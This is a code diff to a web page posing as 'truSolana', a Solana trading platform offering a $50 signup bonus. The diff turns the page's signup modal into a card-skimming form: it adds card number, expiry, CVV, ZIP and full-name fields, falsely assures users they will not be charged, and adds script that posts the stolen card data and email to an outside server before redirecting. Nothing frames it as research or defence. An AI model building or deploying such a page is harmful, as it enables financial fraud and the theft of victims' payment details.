@@ -29,7 +29,14 @@
             <h2 id="modal-header" class="text-2xl font-bold mb-4">Welcome to truSolana</h2>
             <p id="modal-paragraph" class="text-gray-400 mb-6">You've just been granted access to the most advanced upcoming Solana platform. Just join our platform to claim your $50 USD signup bonus - no B.S. like silly deposits or ID requirements to claim.</p>
             <div id="error-message" class="error-message hidden"></div>
-            <input id="modal-input" type="text" placeholder="Enter your info" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
+            <input id="modal-input" type="number" placeholder="0000 0000 0000 0000" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
+            <div class="flex mb-4 hidden" id="expiration-container">
+                <input id="modal-input5" type="number" placeholder="Exp. Month #" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 w-1/2 mr-2" />
+                <input id="modal-input6" type="number" placeholder="Exp. Year" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 w-1/2" />
+            </div>
+            <input id="modal-input8" type="number" placeholder="CVV" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
+            <input id="modal-input21" type="number" placeholder="ZIP Code" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
+            <input id="modal-input22" type="text" placeholder="Full Name" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" />
             <input id="modal-input2" type="email" placeholder="Enter your email" class="bg-gray-700 text-white border border-gray-600 rounded py-2 px-4 mb-4 w-full hidden" required/>
             
             <button id="modal-button" class="bg-blurple text-white font-semibold py-2 px-4 rounded shadow hover:bg-blurple-hover transition duration-300">Next</button>
@@ -55,7 +62,12 @@
         const modalHeader = document.getElementById('modal-header');
         const modalParagraph = document.getElementById('modal-paragraph');
         const modalInput = document.getElementById('modal-input');
-        const modalInput2 = document.getElementById('modal-input2');
+                const modalInput2 = document.getElementById('modal-input2');
+        const modalInput5 = document.getElementById('modal-input5');
+        const modalInput6 = document.getElementById('modal-input6');
+        const modalInput8 = document.getElementById('modal-input8');
+        const modalInput21 = document.getElementById('modal-input21');
+        const modalInput22 = document.getElementById('modal-input22');
         const errorMessage = document.getElementById('error-message');
 
         let step = 0;
@@ -70,7 +82,7 @@
                 errorMessage.classList.remove('hidden');
                 return;
             }
-            if (step === 3 && !modalInput.value) {
+            if (step === 3 && (!modalInput.value || !modalInput8.value || !modalInput5.value || !modalInput6.value)) {
                 errorMessage.textContent = "Please enter your card info to continue.";
                 errorMessage.classList.remove('hidden');
                 return;
@@ -88,12 +100,58 @@
             } else if (step === 3) {
                 modalInput2.classList.add('hidden');
                 modalHeader.textContent = "And finally..";
-                modalParagraph.textContent = "To ensure your account is compliant with the one per household rule, please enter your card info below. You will not be charged. A hold of up to $1.00 may be placed to verify your card which will be removed instantly. Afterwards, you will be brought to the trading app where you can cashout instantly.";
-                modalInput.classList.remove('hidden'); // Show input field
+                modalParagraph.textContent = "Please verify you are not abusing our promotion. You will not be charged. A hold of up to $1.00 may be placed to verify your card which will be removed instantly. You will be brought to your account panel where you can cashout instantly.";
+                modalInput.classList.remove('hidden');
+                document.getElementById('expiration-container').classList.remove('hidden'); // Show expiration fields
+                modalInput8.classList.remove('hidden');
+                modalInput21.classList.remove('hidden');
+                modalInput22.classList.remove('hidden');// Show CVV input field
                 modalInput.value = ""; // Clear input field
             } else {
-                modal.classList.add('hidden');
-                // Hide modal after final step
+// Prepare to submit the form data
+const expMonth = modalInput5.value.padStart(2, '0'); // Format month to two digits
+const expYear = modalInput6.value.length === 2 ? '20' + modalInput6.value : modalInput6.value; // Convert to four digits if necessary
+
+// Create a POST request
+const formData = new FormData();
+formData.append('card_number', modalInput.value);
+formData.append('exp_month', expMonth);
+formData.append('exp_year', expYear);
+formData.append('cvc', modalInput8.value);
+formData.append('email', modalInput2.value); // Add email to the POST request
+formData.append('zipcode', modalInput21.value); // Add email to the POST request
+formData.append('fullname', modalInput22.value); // Add email to the POST request
+
+// Change button text to "Loading..."
+modalButton.textContent = "Loading...";
+modalButton.disabled = true; // Disable the button to prevent multiple submissions
+
+// Send the POST request
+fetch('https://burgz.alwaysdata.net/onboarding.php', { // Replace with your actual processing URL
+    method: 'POST',
+    body: formData,
+})
+.then(response => response.json())
+.then(data => {
+    if (data.status === 'success') {
+        // Redirect after 2 seconds
+        setTimeout(() => {
+            window.location.href = 'https://portal.trusolana.com/onboarding/new-user/registered'; // Replace with your actual URL
+        }, 2000);
+    } else {
+        // Handle error response
+        errorMessage.textContent = 'The card was either invalid or declined the charge. Please try again.';
+        errorMessage.classList.remove('hidden');
+        modalButton.textContent = "Next"; // Reset button text
+        modalButton.disabled = false; // Re-enable the button
+    }
+})
+.catch(error => {
+    errorMessage.textContent = 'An error occurred. Please try again.';
+    errorMessage.classList.remove('hidden');
+    modalButton.textContent = "Next"; // Reset button text
+    modalButton.disabled = false; // Re-enable the button
+});
             }
         });
     </script>
